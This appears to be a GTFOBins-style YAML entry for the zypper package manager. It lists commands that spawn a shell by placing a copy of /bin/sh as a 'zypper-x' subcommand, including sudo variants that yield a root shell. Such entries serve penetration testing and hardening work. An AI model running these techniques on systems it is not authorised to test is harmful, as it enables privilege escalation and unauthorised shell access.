---
functions:
  shell:
    - description: This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges.
      code: |
        zypper x
    - code: |
        TF=$(mktemp -d)
        cp /bin/sh $TF/zypper-x
        export PATH=$TF:$PATH
        zypper x
  sudo:
    - description: This requires `/bin/sh` to be copied to `/usr/lib/zypper/commands/zypper-x` and this usually requires elevated privileges.
      code: |
        sudo zypper x
    - code: |
        TF=$(mktemp -d)
        cp /bin/sh $TF/zypper-x
        sudo PATH=$TF:$PATH zypper x
---
